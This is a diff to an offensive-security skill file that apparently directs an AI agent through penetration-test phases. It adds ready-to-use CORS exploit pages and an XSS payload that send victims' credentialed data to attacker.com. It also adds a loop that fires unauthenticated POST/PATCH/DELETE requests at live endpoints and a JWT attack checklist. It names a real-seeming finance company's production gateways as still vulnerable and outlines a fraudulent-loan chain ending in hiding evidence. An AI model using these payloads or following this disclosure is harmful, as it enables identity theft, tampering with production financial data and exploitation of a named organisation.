@@ -8,9 +8,8 @@ argument-hint: "<command: start|preflight|status|resume|next|escalate|cleanup|re
 metadata:
   hermes:
     tags: [pentest, penetration-testing, security, recon, exploitation, post-exploitation, red-teaming, offensive-security]
-    related_skills: [sc1-recon, sc3-vuln-scan]
     tags: [pentest, penetration-testing, security, recon, exploitation, post-exploitation, red-teaming, offensive-security]
-    related_skills: [godmode, parse-finding]
+    related_skills: [godmode, parse-finding, mtest, scode]
 ---
 
 # Penetration Testing Framework
@@ -260,6 +259,7 @@ When generating phase checklists during `start`, filter techniques by scope type
 | 2 | OS Fingerprinting | N | Y | N | N | Y |
 | 2 | Network Topology Mapping | N | Y | Y | N | Y |
 | 3 | Directory & File Brute-Force (MANDATORY) | Y | N | N | N | Y |
+| 3 | HTTP Method Testing on Unauth Endpoints (MANDATORY) | Y | N | Y | N | Y |
 | 3 | API Endpoint Discovery (MANDATORY) | Y | N | Y | Y | Y |
 | 3 | Parameter Discovery | Y | N | N | Y | Y |
 | 3 | Virtual Host Enumeration | Y | N | N | N | Y |
@@ -270,6 +270,7 @@ When generating phase checklists during `start`, filter techniques by scope type
 | 3 | Bulk Actuator/Admin Scan (MANDATORY) | Y | N | Y | N | Y |
 | 5 | Threat Modeling | Y | Y | Y | Y | Y |
 | 5 | Nuclei Scan (MANDATORY) | Y | N | Y | N | Y |
+| 5 | CORS Origin Reflection Testing (MANDATORY) | Y | N | Y | N | Y |
 | 5 | Nikto Scan | Y | N | N | N | Y |
 | 5 | SSL/TLS Assessment | Y | Y | Y | N | Y |
 | 5 | CVE Mapping | Y | Y | Y | Y | Y |
@@ -318,7 +319,7 @@ If `state.yaml` cannot be read:
 |---------|-------|-----------|---------------|
 | 1 | Passive Reconnaissance | `recon-passive.md` | Attack surface mapped, subdomains validated, technologies identified |
 | 2 | Active Reconnaissance | `recon-active.md` | Subdomain list expanded via active DNS techniques, all hosts port-scanned, services detected, network topology mapped |
-| 3 | Enumeration | `enumeration.md` | Applications enumerated, APIs mapped, parameters discovered |
+| 3 | Enumeration | `enumeration.md` | Applications enumerated, APIs mapped, parameters discovered, Prometheus metrics mined for hidden services |
 | 4 | Attack Surface Mapping | `attack-surface.md` | Asset inventory confirmed with user, scope finalized, entry points mapped |
 
 ### Phase 4: Dismissal Rules
@@ -359,7 +360,7 @@ When mapping the attack surface, score each asset to determine exploitation prio
 - 3-4: Low target — skip unless nothing else works
 
 This prevents wasting time on hardened low-value targets while missing easy wins on high-value ones.
-| 5 | Threat Modeling & Vuln Assessment | `vuln-assessment.md` | Attack trees documented, vuln scans complete, vectors prioritized |
+| 5 | Threat Modeling & Vuln Assessment | `vuln-assessment.md` | Attack trees documented, vuln scans complete, CORS reflection tested on all auth endpoints, vectors prioritized |
 | 6 | Exploitation | `exploit.md` | All mandatory techniques executed, credential inventory validated, top 5 vectors attempted, attack chains documented (see `references/phase6-exploitation-framework.md`) |
 | 7 | Post-Exploitation | `post-exploit.md` | Access type classified, appropriate playbook completed, data scope documented, attack path diagram created, credentials added to inventory (see `references/phase7-post-exploitation-framework.md`) |
 | 8 | Reporting | `report.md` | Final report delivered, pre-delivery checklist passed (see `references/phase8-reporting-process.md`) |
@@ -395,6 +396,8 @@ Adjust based on scope size. Large scope (50+ hosts) → more recon time. Small s
 **Continuous/internal engagements:** When the operator is a full-time internal pentester (no time-box), set `time_budget.mode: "continuous"` in state.yaml. Track time spent for reporting purposes only — no budget enforcement. The effort allocation percentages still guide sequencing priority but don't trigger over-budget alerts.
 
 **Move-on heuristic:** If a technique yields no new results after 15–20 minutes of active work, mark it `DONE` (no findings) or `FAILED (diminishing returns)` and proceed to the next technique.
+
+**Continuous engagement override:** For internal/continuous engagements (`time_budget.mode: "continuous"`), the 15-20 min heuristic is a GUIDELINE, not a hard rule. Vectors that show partial progress (e.g., JWT algorithm identified but secret not yet cracked, heapdump downloaded but not fully analyzed with MAT) deserve extended time. Use judgment: if the technique is producing incremental intelligence (even without a confirmed finding), continue. The heuristic exists to prevent spinning on dead-end vectors, not to cut short promising leads.
 
 ---
 
@@ -659,6 +662,58 @@ For targets in financial services (banking, multi-finance, insurance), consider 
 - 15-minute time-boxed procedure
 - Integration with Phase 6 checklist and attack chains
 
+### HTTP Method Testing on Unauthenticated Endpoints (MANDATORY)
+
+**When you find an unauthenticated GET endpoint, ALWAYS test other HTTP methods.** This is the single highest-ROI exploitation technique for API-focused engagements.
+
+```bash
+# For every unauthenticated endpoint discovered in Phase 3/5:
+for method in POST PUT PATCH DELETE OPTIONS; do
+  curl -sk -X $method -w " [%{http_code}]" "$ENDPOINT" \
+    -H "Content-Type: application/json" -d '{"name":"pentest-probe","code":"PT"}'
+done
+```
+
+**Interpretation:**
+- 200/201 on POST → **CRITICAL: unauthenticated record creation**
+- 200 on PATCH/PUT → **CRITICAL: unauthenticated data modification**
+- 200 on DELETE → **CRITICAL: unauthenticated data destruction**
+- 405 Method Not Allowed → safe (method explicitly blocked)
+- 401/403 → safe (auth enforced per-method)
+- 500 → ambiguous (may be unimplemented OR may be a payload format issue — try different bodies)
+
+**Why this matters:** Many Spring Boot APIs use `@GetMapping` without auth but forget that the same controller may have `@PostMapping`/`@PatchMapping` that also lacks auth. The WAF/gateway may only enforce auth on specific paths, not methods.
+
+**Real-world example (BFI Finance, May 2026):**
+- `/master/v1/general` GET returned 4,199 records without auth (reported as High — read-only)
+- Testing POST created a new record: `{"id":5661,"name":"test","code":"TEST"}` — no auth required
+- Testing PATCH modified record #1 (production credit scoring rule) — no auth required
+- Finding upgraded from High (7.5) to **Critical (9.1)** — unauthenticated write on production financial data
+- Attack chain: modify NST approval thresholds → fraudulent loans auto-approved → revert to hide evidence
+
+**Checklist (add to Phase 6 technique 6.5):**
+- [ ] Test POST on all unauthenticated GET endpoints
+- [ ] Test PATCH on all unauthenticated GET endpoints with `/{id}` suffix
+- [ ] Test PUT on all unauthenticated GET endpoints with `/{id}` suffix
+- [ ] Test DELETE on all unauthenticated GET endpoints with `/{id}` suffix
+- [ ] If write succeeds: immediately revert, document evidence, escalate
+
+### Fix Verification (Redo/Reassessment Engagements)
+
+When redoing a pentest or reassessing previously reported findings:
+
+1. **Test ALL gateways/paths to the same backend** — a fix applied to one gateway (e.g., `microservices.prod.bfi.co.id`) may NOT be applied to another gateway routing to the same service (e.g., `microservices.prod.bravo.bfi.co.id`). In the BFI redo, F-1 was "fixed" on one gateway but the Bravo gateway remained fully vulnerable.
+2. **Test the exact same PoC** — don't assume the fix works. Replay the original exploit steps verbatim.
+3. **Test adjacent endpoints** — if `/master/v1/general` was fixed, check `/master/v1/address/province`, `/master/v1/bank`, etc.
+4. **Document fix status per gateway:**
+   ```markdown
+   | Gateway | Endpoint | Previous Status | Current Status |
+   |---------|----------|----------------|----------------|
+   | microservices.prod.bfi.co.id | /master/v1/general | Vuln (GET/POST/PATCH) | Fixed (401) |
+   | microservices.prod.bravo.bfi.co.id | /master/v1/general | Vuln (GET/POST/PATCH) | STILL VULNERABLE |
+   ```
+5. **Incomplete fixes are findings** — document as "Incomplete Remediation" with reference to the original finding ID. Severity remains the same (or higher if the incomplete fix creates false confidence).
+
 ### Credential Chaining
 
 When credentials are discovered (heapdump, JS files, CTI, Snyk), systematically chain them across environments and services:
@@ -689,6 +744,18 @@ Production environments often share credentials, service accounts, or trust rela
 
 **Key principle:** Lower environments are often less protected but share credentials with production. A heapdump from mock can yield prod access.
 
+### JWT Attack Techniques (Full Reference)
+
+**Full reference:** See `references/jwt-attack-techniques.md` for:
+- Decision tree (what to try based on what you have)
+- 12-technique checklist with priority order
+- Signature bypass (alg:none, unverified signatures)
+- Header injection (jwk, jku, kid traversal, kid SQLi, x5c)
+- Algorithm confusion (RS256→HS256 with public key)
+- Secret brute-force (hashcat, jwt_tool, custom Python)
+- Token endpoint abuse (Keycloak public clients, device code, CIBA)
+- Post-exploitation with forged tokens
+
 ### Token Exchange & Authentication Bypass
 
 When a Keycloak token endpoint is found:
@@ -714,6 +781,126 @@ When a Keycloak token endpoint is found:
    ```
 
 ### WAF/Ingress Bypass Techniques
+
+When WAF blocks sensitive paths (actuator, swagger, admin), try these in order:
+
+### CORS Origin Reflection Testing (MANDATORY Phase 5)
+
+**Why mandatory:** CORS misconfiguration with credentials is a standalone Critical finding for financial services. It enables cross-origin identity theft without any other vulnerability. The BFI engagement found arbitrary origin reflection + credentials on production Keycloak `/userinfo` — any malicious page could steal employee identity.
+
+**Procedure (run on ALL auth endpoints discovered in Phases 1-5):**
+
+```bash
+# Test targets: Keycloak userinfo, token endpoints, any authenticated API
+TARGETS=(
+  "https://target/keycloak/realms/REALM/protocol/openid-connect/userinfo"
+  "https://target/keycloak/realms/REALM/protocol/openid-connect/token"
+  "https://target/api/v1/user/profile"
+  # Add all auth-bearing endpoints
+)
+
+for URL in "${TARGETS[@]}"; do
+  echo "=== $URL ==="
+  for origin in \
+    "https://evil.com" \
+    "https://target.com.attacker.com" \
+    "https://attackertarget.com" \
+    "https://target.com.evil.net" \
+    "http://target.com" \
+    "null" \
+    "https://localhost"; do
+    echo -n "  Origin: $origin → "
+    curl -sk -H "Origin: $origin" -D- "$URL" 2>/dev/null | grep -i "access-control-allow"
+  done
+done
+```
+
+**Origin test rationale:**
+- `https://evil.com` — arbitrary origin (full reflection)
+- `https://target.com.attacker.com` — suffix bypass (whitelist checks "ends with target.com")
+- `https://attackertarget.com` — prefix bypass (whitelist checks "contains target.com")
+- `https://target.com.evil.net` — subdomain-of-attacker bypass
+- `http://target.com` — TLS downgrade (HTTPS app trusts HTTP origin → MitM exploitable)
+- `null` — sandboxed iframe exploit (whitelisted for local dev)
+- `https://localhost` — dev origin left in whitelist
+
+**Interpretation:**
+- `ACAO: <reflected>` + `ACAC: true` → **CRITICAL** — exploitable cross-origin credential theft
+- `ACAO: null` + `ACAC: true` → **CRITICAL** — exploitable via sandboxed iframe
+- `ACAO: *` + `ACAC: true` → Browser contradiction (browsers ignore credentials with wildcard) — still document as misconfiguration (Medium)
+- `ACAO: *` without `ACAC` → Low risk (no credential leakage)
+- `ACAO: <specific trusted origin>` → Properly configured
+
+**Key targets for CORS testing:**
+- Keycloak `/userinfo` (identity theft)
+- Any `/me` or `/profile` endpoint
+- Token endpoints (token theft)
+- API endpoints that return sensitive data with session cookies
+
+**Report as Critical when:** Origin reflection + credentials + endpoint returns PII/session data. For financial services, this violates POJK 11/2022 (employee identity protection).
+
+**Exploitation PoC (include in finding evidence):**
+
+When CORS reflection is confirmed, include this ready-to-use exploit template in the finding:
+
+```html
+<!-- CORS Exploit — Origin Reflection with Credentials -->
+<html>
+<body>
+<h1>CORS PoC — Data Exfiltration</h1>
+<script>
+var req = new XMLHttpRequest();
+req.onload = function() {
+  // Display stolen data
+  document.getElementById('result').innerText = this.responseText;
+  // Exfiltrate to attacker server
+  fetch('https://attacker.com/log?data=' + btoa(this.responseText));
+};
+req.open('GET', 'https://VULNERABLE-TARGET/keycloak/realms/REALM/protocol/openid-connect/userinfo', true);
+req.withCredentials = true;
+req.send();
+</script>
+<pre id="result">Waiting for data...</pre>
+</body>
+</html>
+```
+
+**For null origin exploitation (sandboxed iframe):**
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+  srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = function() {
+      // Origin is 'null' from sandboxed iframe
+      document.location = 'https://attacker.com/log?data=' + btoa(this.responseText);
+    };
+    req.open('GET', 'https://VULNERABLE-TARGET/api/sensitive-data', true);
+    req.withCredentials = true;
+    req.send();
+  </script>">
+</iframe>
+```
+
+**Attack chain: XSS on trusted subdomain → CORS data theft:**
+
+If the target trusts `*.target.com` origins and you find XSS on any subdomain (e.g., `blog.target.com`), chain them:
+1. Find XSS on trusted subdomain (even reflected XSS works)
+2. XSS payload makes credentialed CORS request to main app
+3. Main app reflects the trusted subdomain origin + credentials
+4. Attacker steals victim's data via the XSS → CORS chain
+
+```
+https://blog.target.com/search?q=<script>
+  fetch('https://api.target.com/user/profile',{credentials:'include'})
+  .then(r=>r.text())
+  .then(d=>fetch('https://attacker.com/steal?d='+btoa(d)))
+</script>
+```
+
+This upgrades a "Low" reflected XSS on a blog to a "Critical" account takeover on the main API.
+
+### WAF/Ingress Bypass Techniques (Conditional)
 
 When WAF blocks sensitive paths (actuator, swagger, admin), try these in order:
 
